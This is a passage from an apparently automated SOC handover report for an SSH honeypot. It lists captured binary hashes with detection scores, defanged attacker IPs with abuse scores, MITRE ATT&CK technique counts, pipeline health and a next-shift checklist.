| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `101.96.202[.]176` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 0 |
| `47.93.1[.]160` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 10 |
| `64.251.101[.]143` | US | Reserve Long Distance Company, Inc | **100** ⚠️ | 0 |
| `120.48.77[.]176` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 12 |
| `95.102.39[.]248` | SK | Slovak Telekom, a.s. | **100** ⚠️ | 30 |
| `111.70.23[.]235` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 25 |
| `148.153.188[.]246` | US | CDS Global Cloud Co., Ltd | **100** ⚠️ | 50 |
| `120.241.79[.]66` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `125.247.116[.]158` | KR | DACOM-PUBNETPLUS | **100** ⚠️ | 36 |
| `118.186.208[.]20` | CN | Beijing xhxt technology development co., LTD | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 40 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 14 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 10 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 2 |

---

## 🔕 False Positive Summary (3 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 47 cases |
| Tool 34  | Credential Extractor        | ✅ 24 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 17 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3 filtered (6.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 14 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 10 priority case(s) shown individually · 13 recon entry/entries in table (5 group(s) consolidating 26 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-05T10:32:01Z_
